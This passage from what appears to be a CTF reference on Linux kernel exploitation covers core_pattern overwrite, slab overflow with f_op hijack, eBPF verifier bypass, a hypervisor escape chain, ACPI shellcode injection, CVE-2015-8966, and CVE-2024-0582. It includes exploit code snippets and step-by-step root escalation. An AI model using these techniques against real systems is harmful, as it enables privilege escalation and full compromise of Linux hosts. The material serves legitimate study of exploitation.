**When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.

---

## core_pattern Overwrite

Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or the internal `core_pattern` variable) with a pipe command. When a process crashes, the kernel executes the specified command as root to handle the core dump.

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:

1. Set breakpoint on `override_creds()` (called by `do_coredump()`)
2. Crash a process: `int main() { ((void(*)())0)(); }`
3. After `override_creds` returns, disassemble -- look for `movzx` loading from a data address
4. That address is `core_pattern`

**Key insight:** `core_pattern` is an alternative to `modprobe_path` when `CONFIG_STATIC_USERMODEHELPER` blocks modprobe. Overwrite it with `|/tmp/evil.sh` and crash any process to trigger root command execution. Finding the address requires a GDB breakpoint on `override_creds` during a deliberate crash since `core_pattern` is not always exported in `/proc/kallsyms`.

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)

**Pattern:** Kernel module allocates `kmalloc(content_length)` but copies `0x40 + content_length` bytes (header + body), causing a 0x40-byte heap overflow into adjacent slab objects.

```c
// Vulnerable pattern in kernel HTTP handler:
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
memcpy(buf + 0x40, body, content_length); // Overflow!
```

**Exploitation:**
1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
4. **Corrupt `f_op`:** Overwrite the `f_op` (file operations) pointer in the adjacent `struct file` to redirect function pointers
5. **Hijack write handler:** `f_op->write` now points to attacker-controlled address → `commit_creds(prepare_kernel_cred(0))`

**Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.

---

## eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)

Exploit mismatches between the eBPF verifier's static analysis and runtime behavior to achieve arbitrary kernel read/write.

```c
// Pattern: Verifier tracks register states differently from hardware
// Example: Right-shift desynchronization (D^3CTF 2022)
// Verifier thinks: shr reg, 64 -> reg = 0
// Hardware does:   shr reg, 64 -> reg = original_value (shift >= width = undefined)

// Step 1: Create desynchronized register
BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // verifier: R7=0, runtime: R7=1

// Step 2: Use desync to bypass ALU sanitizer
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // verifier: 0*offset=0, runtime: 1*offset=offset

// Step 3: Add to map pointer for OOB access
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
// Runtime: map_ptr + offset -> arbitrary kernel memory access

// Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
```

```bash
# eBPF exploitation workflow:
# 1. Find verifier vs runtime mismatch (RSH, bounds tracking, helper params)
# 2. Create register with verifier_value != runtime_value
# 3. Use desync register to bypass pointer arithmetic checks
# 4. Achieve arbitrary read via map value OOB
# 5. Leak kernel base from adjacent slab objects
# 6. Arbitrary write to modprobe_path or current->cred

# Helper function overflow variant (d3bpf-v2):
# bpf_skb_load_bytes(skb, offset, stack_buf, len)
# Verifier checks len <= 512, but desync makes runtime len huge
# Stack buffer overflow -> ROP to commit_creds(init_cred)

# KASLR bypass via eBPF:
# Trigger controlled oops -> dmesg leaks kernel addresses
# Or: read adjacent slab objects containing kernel pointers
```

**Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches -- each patch implies a prior exploitable bug.

See also: [kernel-techniques.md](kernel-techniques.md) for additional kernel exploitation techniques.

---

## User-Kernel-Hypervisor Chain via I/O Port Hypercalls (HITCON 2018)

**Pattern:** A three-layer challenge (user.elf → kernel.bin → hypervisor) restricts direct hypercalls from userspace via a whitelist enforced in kernel.bin. The attacker (1) corrupts a RPN-calculator user-mode program to write arbitrary bytes into its GOT, (2) uses that write to break out to kernel mode, and (3) from kernel mode issues a hypercall directly by executing `out dx, eax` on I/O ports `0x8000..0x80FF`, which the hypervisor handles as a syscall dispatch. The final twist: the hypervisor only accepts strings that already live in kernel memory, so a deliberately failing `open()` syscall is used to seed a kernel buffer with the target path before re-invoking the hypercall with that buffer address.

```asm
; Kernel-mode stub running inside kernel.bin after the pivot
mov dx, 0x8000 + 5          ; I/O port = base + syscall_number (here: open)
mov eax, <kernel_buffer>    ; pointer that lives in kernel memory
out dx, eax                 ; hypervisor reads from the port as an arg

mov dx, 0x8000 + 0          ; syscall 0 = read
mov eax, flag_buffer
out dx, eax
```

```python
# User-mode payload that pivots into kernel.bin via GOT overwrite
from pwn import *
io = remote("challenge.hitcon", 1337)

# 1. RPN-calc overwrites got['strtol'] with a kernel gadget that calls the
#    privileged hypercall stub.
payload = rpn_overwrite(target="strtol",
                        value=kernel_gadget_address)
io.sendline(payload)

# 2. Kernel stub runs the I/O-port sequence above and writes the flag back.
io.recvuntil(b"flag{")
log.success(b"flag{" + io.recvuntil(b"}"))
```

**Key insight:** The more privilege rings a challenge stacks, the more important it is to map *where data must live* versus *where code must run*. HITCON Abyss enforced a kernel whitelist on userspace hypercalls, but kernel code itself could still poke the hypervisor ports directly. The same pattern recurs in real VM escapes: a guest kernel primitive plus an I/O-port write reaches the VMM without going through the guest's own syscall table. When attacking `kvm_guest_enter` style hypervisors, look for memory-mapped I/O regions or port ranges that the VMM traps — they are hypercalls in disguise and often lack the argument sanitisation that formal hypercall interfaces require.

**References:** HITCON CTF 2018 — Abyss I & II, writeups 11918, 11919, 11933, 11934, 11937, 11938

---

## ACPI DSDT Shellcode Injection for Privilege Escalation (hxp 2018)

**Pattern:** "Green Computing" style challenges boot a kernel with attacker-controlled ACPI tables. Embed shellcode inside a DSDT `OperationRegion(SystemMemory, ...)` and write it into kernel memory with a `Field` write at boot. Patch a target like `commit_creds` so any subsequent setuid call elevates privileges.

```asl
OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }

OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
Field (NISC, AnyAcc, NoLock, Preserve) { NICD, 768 }
NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
```

**Key insight:** ACPI AML runs with direct physical memory access before normal kernel protections are active. When the challenge lets you supply DSDT/SSDT bytes, `SystemMemory` `OperationRegion` is a kernel-write primitive bigger than most explicit kernel bugs.

**References:** hxp CTF 2018 — Green Computing 1-2, writeups 12550+

---

## ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil (Insomnihack 2019)

**Pattern:** Bug: `fcntl64` on ARM Linux set `KERNEL_DS` via `set_fs()` and never restored it. Exploit: fork a child that calls `fcntl64`, then have the child write arbitrary kernel addresses through a pipe; parent reads the pipe back. Direct reads of MMU regions panic, so pipes act as a safe shim.

```c
if (fork() == 0) {
    trigger_fcntl64_bug();                // now at KERNEL_DS
    write(pipe_w, (void*)kernel_addr, N); // unchecked kernel read
    _exit(0);
}
read(pipe_r, leak, N);                    // parent gets kernel memory
```

After leaking the cred struct, rewrite `uid/gid/euid/egid = 0` in place and call `getuid()` to confirm root.

**Key insight:** Missing `set_fs(USER_DS)` restoration is a single-line bug that gives unbounded copy_from/to_user with kernel addresses. Wrap dangerous reads through a pipe so the kernel copy loop never touches forbidden MMU regions directly.

**References:** Insomnihack teaser 2019 — 1118daysober, writeup 12903

---

## io_uring PBUF_RING Use-After-Free — CVE-2024-0582 (KernelCTF 2024)

**Vulnerability:** `io_uring` buffer ring registration (`IORING_REGISTER_PBUF_RING` / `IORING_UNREGISTER_PBUF_RING`) mishandles the lifetime of `io_buffer_list` / `io_buffer` objects. Unregister frees the ring while in-flight `PROVIDE_BUFFERS` requests still hold a reference, leading to UAF. Patched Feb 2024 (`io_uring: fix UAF on pbuf ring`).

**Critical distinction — PBUF_RING (kernel-registered) vs userspace SQE:**

| Aspect | PBUF_RING (`IORING_REGISTER_PBUF_RING`) | Userspace SQE (`IORING_OP_PROVIDE_BUFFERS`) |
|--------|------------------------------------------|---------------------------------------------|
| Backing | Kernel-allocated `io_buffer_list` registered via `io_uring_register()`; kernel tracks refcount | Userspace-mapped SQ ring; entry is a raw `struct io_uring_sqe` copied via `copy_from_user()` |
| Lifetime | Managed by `io_buffer_list.ref` — must survive until all `provide_buffers` complete | Ephemeral — SQE consumed synchronously in `io_submit_sqe()` |
| Bug surface | `io_unregister_pbuf_ring()` drops `bl->ref` and `kfree(bl)` without waiting for pending `IORING_OP_PROVIDE_BUFFERS` that still dereference `bl->buf_ring` | Not vulnerable — SQE is stack-copied; no persistent pointer |
| Exploit path | Register PBUF_RING → spray `PROVIDE_BUFFERS` that block on `io_buffer` → unregister ring (UAF free) → reallocate `bl` with controlled data → complete blocked requests → kernel writes attacker-controlled `bid`/`resv` to freed `io_buffer` → type confusion / ROP | Cannot reallocate SQE ring entry; no UAF primitive |

**Exploit pattern (KernelCTF 2024):**

```c
// 1. Register a PBUF_RING of size 0x1000
struct io_uring_params p = {};
int ring_fd = io_uring_setup(8, &p);
struct io_uring_buf_ring *br;
posix_memalign((void**)&br, 4096, 4096);
io_uring_register_buf_ring(ring_fd, &(struct io_uring_buf_reg){
    .ring_addr = (unsigned long)br,
    .ring_entries = 16,
    .bgid = 1,
});

// 2. Spray blocking PROVIDE_BUFFERS that pin the ring
for (int i = 0; i < 16; i++) {
    struct io_uring_sqe *sqe = &sqes[i];
    io_uring_prep_provide_buffers(sqe, br, 0, 16, 1, 0);
    sqe->flags |= IOSQE_IO_LINK; // keep request pending
}
io_uring_submit(ring_fd);

// 3. Unregister while requests are still in-flight → UAF free of io_buffer_list
io_uring_unregister_buf_ring(ring_fd, 1); // kfree(bl) but sqes still reference bl->bufs

// 4. Heap spray to reclaim UAF slot (e.g., msg_msg, seq_operations, cred)
spray_kmalloc_1024(controlled_data); // reclaim io_buffer_list with fake buf_ring pointer

// 5. Complete pending requests — kernel writes to reclaimed buffer as if it were buf_ring
//    → arbitrary kernel write (controlled bid offset) or info leak via IORING_OP_READ
```

**Key primitives:**
- **Leak:** Free ring then `IORING_OP_READ` from pending `provide_buffers` leaks reclaimed heap content (contains `msg_msg` `m_list` pointers → kheap/kaslr).
- **Write:** Reclaim with `cred` or `modprobe_path` adjacent object; completing the request overwrites `uid` or function pointer.

**Detection & fix check:**
```bash
# Vulnerable kernels: 6.4 - 6.6.13, 6.7 prior to 6.7.2
uname -r
# Check patch: io_uring/io_uring.c should have io_buffer_list_put() + synchronize
grep -n "io_buffer_list_put\|pbuf.*ref" io_uring/register.c
```

**Key insight:** The bug is *only* in the **kernel-registered PBUF_RING** path (`register`/`unregister`), not the generic userspace SQE `PROVIDE_BUFFERS` path. Many public PoCs confuse the two and attempt to free the SQ ring itself (which is just `mmap`'d userspace memory). Successful exploitation must use `IORING_REGISTER_PBUF_RING` to allocate a kernel `io_buffer_list`, then race `UNREGISTER` against pending `PROVIDE_BUFFERS` — that race is where the UAF lives.

**References:** CVE-2024-0582, KernelCTF 2024, patch `f0b09d80f55e` (Feb 2024).
